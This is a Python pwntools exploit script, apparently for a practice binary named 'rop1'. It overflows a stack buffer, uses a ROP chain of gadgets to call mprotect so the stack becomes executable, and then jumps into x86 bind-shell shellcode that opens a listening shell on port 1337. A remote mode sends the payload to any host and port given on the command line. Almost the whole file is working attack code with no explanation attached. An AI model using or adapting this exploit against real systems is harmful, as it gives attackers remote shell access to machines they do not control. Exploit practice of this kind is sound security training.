#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath], gdbscript=gdbscript, aslr=False)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath])


binPath="./rop1"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *Test+32
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="info"
io = start()

elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

# define payload
overFlow = b'A'*16

# define gadgets for mprotect
libcBase = 0xf7db9000
popEAX =   pwn.p32(0x080491aa)
popEBX =   pwn.p32(0x0804901e)
popECX =   pwn.p32(0x080491b3)
popEDX =   pwn.p32(0x0003456c + libcBase)
int80 =    pwn.p32(0x080491c3)

# define gadgets for payload
pushESP =  pwn.p32(0x00144d86 + libcBase)
NOPs = 12*b"\x90"

# bindshell to port 1337 source:
# https://shell-storm.org/shellcode/files/shellcode-882.html
bindShell = b"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

payload = pwn.flat(
        [
           overFlow,
           popEAX,
           0x7d,
           popECX,
           0x021000,
           popEBX,
           0xffff0000,
           popEDX,
           0x7,
           int80,
           pushESP,
           NOPs,
           bindShell
            ]
        )
pwn.info("Payload length: %d",len(payload))

io.sendline(payload)
io.interactive()

